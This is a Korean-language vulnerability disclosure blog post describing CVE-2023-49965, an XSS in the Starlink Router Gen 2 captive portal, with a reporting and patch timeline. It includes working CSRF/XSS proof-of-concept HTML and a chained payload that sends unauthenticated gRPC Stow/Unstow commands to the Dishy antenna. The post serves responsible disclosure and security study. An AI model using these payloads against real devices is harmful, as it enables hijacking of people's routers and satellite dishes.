---
title: "2023 SPACEX / STARLINK Router Gen 2 XSS (KOR)"
description: "Found by Sehyoung Lee @hackintoanetwork"
dateString: Dec 2023
draft: false
tags: ["SpaceX", "Starlink", "Router", "Dishy" ,"Exploit", "Hacking", "CVE-2023-49965"]
---
# TL;DR

---

2세대 라우터의 초기 `captive portal` 페이지에서 발생하는 `Cross-Site Scripting (XSS)` 취약점을 통해 공격자는 `Router` 및 `Dishy`를 제어할 수 있습니다.

# **The Basics**

---

- **Product :** Starlink Router Gen 2
- **Tested Version :** 2022.32.0 (The fix is in versions 2023.48.0 and up)
- **Bug-class** : XSS (Cross-Site Scripting)

# ****Overview of the Vulnerability****

---

![img1.webp](/blog/2023-Starlink-Router-Gen2-XSS/img1.webp)

해당 취약점은 초기 `captive portal` 페이지(http://192.168.1.1/setup)에서 `ssid` 및 `password` 파라미터에 대한 입력 값 필터링이 충분하지 않아 발생합니다.

```html
<html>
	<body>
		<h1>Proof of Concept</h1>
		<form id="PoC" method="POST" action="http://192.168.1.1/setup">
			<input type="hidden" name="ssid" value='" onfocus=javascript:alert(`XSS`); autofocus="'>
			<!-- <input type="hidden" name="password" value='" onfocus=javascript:alert(`XSS`); autofocus="'> -->
		</form>
		<script type="text/javascript">
			document.addEventListener("DOMContentLoaded", function() {
				document.getElementById("PoC").submit();
			});
		</script>
	</body>
<html>
```

해당 `Cross-Site Scripting (XSS)` 취약점은 위의 PoC(Proof of Concept)처럼 `Cross-Site Request Forgery (CSRF)` 공격과 함께 활용될 수 있습니다.

[reproduce(PoC).mov](/blog/2023-Starlink-Router-Gen2-XSS/reproduce(PoC).mov)

# **Exploit**

---

일반적으로는 `Router`의 내부 주소인 192.168.1.1에서만 `captive portal` 페이지가 활성화되어야 하지만, 구형 라우터에서는 `Dishy`의 내부 주소인 192.168.100.1에서도 예상치 않게 `captive portal` 페이지에 접근할 수 있는 버그가 있었습니다.

- [http://192.168.1.1/setup](http://192.168.1.1/setup) → 정상적으로 `captive portal` 페이지가 표시됨
    
    ![http://192.168.1.1/setup](/blog/2023-Starlink-Router-Gen2-XSS/img2.png)
    
- [http://192.168.100.1/setup](http://192.168.100.1/setup) → 이 주소에서도 `captive portal` 페이지가 표시됨
    
    ![http://192.168.100.1/setup](/blog/2023-Starlink-Router-Gen2-XSS/img3.png)
    
(원래는 `Dishy`의 내부 주소인 192.168.100.1에서는 `captive portal` 페이지에 접근할 수 없어야 합니다.)

[192.168.100.1_PoC.mov](/blog/2023-Starlink-Router-Gen2-XSS/192.168.100.1_PoC.mov)

[http://192.168.100.1/setup](http://192.168.100.1/setup) 주소에서도 똑같이 `Cross-Site Scripting (XSS)` 취약점이 발생하는 것을 확인할 수 있습니다.

이러한 버그와 `Cross-Site Scripting (XSS)` 취약점을 체이닝하면 브라우저의 `Same-Origin Policy (SOP)`를 우회하여 `Router`와 `Dishy` 모두를 제어할 수 있게 됩니다.

이제 이러한 버그를 활용하여 어떻게 `Router`와 `Dishy`를 제어할 수 있는지 살펴보겠습니다.

## Dishy Stow Request Analysis

---

<center>

![Starlink Dishy Stow](/blog/2023-Starlink-Router-Gen2-XSS/gif1.gif)
</center>

관리자 인터페이스에서 `Stow`명령을 내리면 아래와 같은 HTTP Request가 `Dishy`로 전달됩니다.

(여기서 `Stow`명령은 `Dishy` 안테나를 이동하거나 보관하기 위해 접을 수 있도록 하는 기능입니다.)

```
POST /SpaceX.API.Device.Device/Handle HTTP/1.1
Host: 192.168.100.1:9201
Content-Length: 8
x-grpc-web: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
content-type: application/grpc-web+proto
Accept: */*
Origin: http://dishy.starlink.com
Referer: http://dishy.starlink.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

�}
```

해당 Request의 헤더는 몇 가지 중요한 정보를 담고 있습니다.

- **x-grpc-web: 1**
    
    `gRPC-Web` 프로토콜을 사용함을 나타냅니다. 
    
    (`gRPC-Web`은 웹 클라이언트에서 서버로 gRPC 호출을 가능하게 하는 프로토콜입니다.)
    
- **content-type: application/grpc-web+proto**
    
    전송되는 데이터가 `gRPC` 프로토콜을 사용하고, `protobuf` 형식으로 인코딩되었음을 나타냅니다.
    
- **Request Body**
    
    ![Dishy Stow Request body (Hex)](/blog/2023-Starlink-Router-Gen2-XSS/img4.png)
    
    Dishy Stow Request body (Hex)
    
    ```html
    \x00\x00\x00\x00\x03\xef\xbf\xbd\x7d\x00
    ```
    
    요청 body에는 `grpc-web+proto` 형식의 데이터가 포함되어 있으며, 이 데이터는 `Stow` 명령의 세부 사항을 담고 있을 것 입니다.
    

이 정보를 종합해보면, 사용자가 관리자 인터페이스를 사용하여 `Stow` 명령을 내릴 경우, 해당 명령은 `gRPC`를 통해 `Dishy`로 전송되며, 이 과정에서 `Dishy`는 이동이 용이한 상태로 접혀집니다.

하지만 Request를 살펴보면 해당 요청을 보내는 사용자에 대한 인증이 없다는 것을 알 수 있습니다.

이 말은 관리자가 아닌 다른 누군가가 해당 요청을 똑같이 보내 무단으로 `Dishy`를 제어할 수 있음을 의미하는데, 해당 취약점은 공격자가 로컬 네트워크에 물리적으로 접근할 수 있어야 하므로, 원격으로 발생할 수 있는 공격에 비해 공격 범위가 제한적입니다.

## **CSRF 공격의 가능성과 한계**

---

그렇다면, 같은 요청을 보내는 페이로드로 `Cross-Site Request Forgery (CSRF)` 공격을 시도할 수 있다는 생각이 들 수 있습니다.

물론 `Cross-Site Request Forgery (CSRF)` 공격이 가능한 시나리오일 수 있지만, 브라우저의 `Same-Origin Policy (SOP)` 때문에 이러한 공격이 제한됩니다. 

`gRPC`는 `application/grpc-web+proto`라는 특정한 `content-type` 헤더를 요구합니다. 

그러나, `Same-Origin Policy (SOP)`는 이 헤더를 브라우저가 다른 출처로부터 요청을 보낼 때 제거하도록 합니다. 

이로 인해 일반적인 상황에서는 외부에서 `Dishy`로 `gRPC` 요청을 보내는 것이 불가능합니다.

## XSS : SOP 우회를 위한 효과적인 방법

---

일반적으로 `Same-Origin Policy (SOP)`는 웹 브라우저가 다른 출처로부터의 요청을 제한합니다. 

하지만 `Cross-Site Scripting (XSS)` 취약점을 이용하면, 공격자는 피해자의 웹 브라우저 내에서 스크립트를 실행할 수 있습니다. 

`Cross-Site Scripting (XSS)` 취약점을 이용해 공격자가 삽입한 스크립트는 동일한 출처(즉, 피해자가 현재 접속해 있는 웹사이트)에서 실행된 것으로 간주됩니다. 

이로 인해, `Same-Origin Policy (SOP)`는 이러한 스크립트에 의해 생성된 요청을 같은 출처의 요청으로 인식하며, 따라서 이 경우 `Same-Origin Policy (SOP)`의 제한이 적용되지 않습니다.

따라서 `gRPC` 요청과 같이 특정 `content-type` 헤더를 요구하는 경우 `Cross-Site Scripting (XSS)` 취약점을 이용한 `Cross-Site Request Forgery (CSRF)` 공격에서는, 공격 스크립트가 피해자의 브라우저 내에서 실행되기 때문에 정상적인 요청으로 인식해서 이러한 특정한 `content-type` 헤더도 포함되어 요청이 전송됩니다. 

예를 들어, `192.168.100.1`의 버그와 `Cross-Site Scripting (XSS)` 취약점을 체이닝하면, 공격자는 악의적인 스크립트를 통해 사용자의 브라우저를 프록시 삼아 `Router`나 `Dishy`에 명령을 내리는 요청을 보낼 수 있습니다. (공격자는 `Dishy`의 `Stow` 및 `Unstow` 명령을 포함한 다양한 요청을 보낼 수 있습니다.)

## PoC (Proof of Concept)

---

그러므로, `Cross-Site Scripting (XSS)` 취약점과 앞서 언급한 버그를 체이닝해서 `Dishy`에 `Stow gRPC` 요청을 보내는 페이로드는 다음과 같이 구성할 수 있습니다.
(결과적으로 공격자가 `Router`나 `Dishy`를 원격으로 조종할 수 있게 됩니다. 예를 들어, `Router` 설정을 변경하거나 `Dishy`의 기능을 조작하는 명령을 보낼 수 있습니다.)

```html
<html>
	<body>
		<h1>Dishy Stow and Unstow</h1>
		<form id="PoC" method="POST" action="http://192.168.100.1/setup">
			<!-- <input type="hidden" name="ssid" value='" onfocus=javascript:alert(`XSS`); autofocus="'> -->
			<input type="hidden" name="password" value='"><script>for(let i=0;i<100;i++){setTimeout(()=>{var xhr=new XMLHttpRequest();xhr.open("POST","http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle",true);xhr.setRequestHeader("x-grpc-web","1");xhr.setRequestHeader("Content-Type","application/grpc-web+proto");xhr.onreadystatechange=()=>{if(xhr.readyState==4&&xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=>{var xhr2=new XMLHttpRequest();xhr2.open("POST","http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle",true);xhr2.setRequestHeader("x-grpc-web","1");xhr2.setRequestHeader("Content-Type","application/grpc-web+proto");xhr2.onreadystatechange=()=>{if(xhr2.readyState==4&&xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}</script><input type="hidden'/>
		</form>
		<script type="text/javascript">
			document.addEventListener("DOMContentLoaded", function() {
				document.getElementById("PoC").submit();
			});
		</script>
	</body>
<html>
```

# Demo

---

[Exploit-PoC.mp4](/blog/2023-Starlink-Router-Gen2-XSS/Exploit-PoC.mp4)

# CVE

- [CVE-2023-49965](https://www.cve.org/CVERecord?id=CVE-2023-49965)

# **Time Line**

- 2023-10-10 : Vulnerability reported to SpaceX/Starlink
- 2023-10-12 : Recognized as a security vulnerability with a severity of Moderate ( Reward `$500` USD )
- 2023-11-01 : Patched in the latest release (The fix is in versions `2023.48.0` and up)
